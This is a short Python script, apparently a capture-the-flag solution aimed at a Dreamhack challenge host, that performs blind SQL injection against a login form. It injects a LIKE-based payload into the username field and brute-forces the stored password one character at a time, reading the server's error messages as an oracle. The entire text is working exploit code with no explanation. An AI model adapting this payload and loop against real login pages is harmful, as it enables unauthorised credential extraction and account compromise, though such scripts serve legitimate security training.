import requests
import string

url = "http://host3.dreamhack.games:16705/login"         
ch = "0123456789abcdefBNRY}{"

found = ""
for i in range(40):
    for j in ch:
        guess = found + j                      
        pad = "_" * (40 - len(guess))      
        payload = "Rootsquare' && password like '" + guess + pad + "' #"

        r = requests.post(url, data={"username": payload, "password": "aaa"})

        if "Invalid" not in r.text and "No Hack" not in r.text:
            found += j
            print(f"[{i+1}/{40}] {found}")
            break

print("password =", found)